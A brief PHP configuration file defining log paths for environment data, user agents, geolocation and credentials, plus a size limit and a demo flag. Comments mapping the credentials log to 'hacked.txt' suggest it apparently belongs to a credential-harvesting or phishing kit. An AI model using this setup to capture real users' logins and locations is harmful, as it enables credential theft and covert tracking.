<?php
/**
 * config.php
 * 
 * Central configuration for log paths, environment settings, etc.
 */

// Directory for storing log files
define('LOG_DIR', __DIR__ . '/logs');

// Specific log file paths
define('LOG_FILE_ENV', LOG_DIR . '/environment.log');   // environment/log.txt
define('LOG_FILE_UA',  LOG_DIR . '/user_agents.log');   // l.log
define('LOG_FILE_GEO', LOG_DIR . '/geolocation.log');   // info.txt
define('LOG_FILE_CREDS', LOG_DIR . '/credentials.log'); // hacked.txt

// Max file size before truncation (3 MB here)
define('LOG_MAX_SIZE', 3 * 1024 * 1024);

// For disclaimers or debug toggles
define('DEMO_MODE', true);
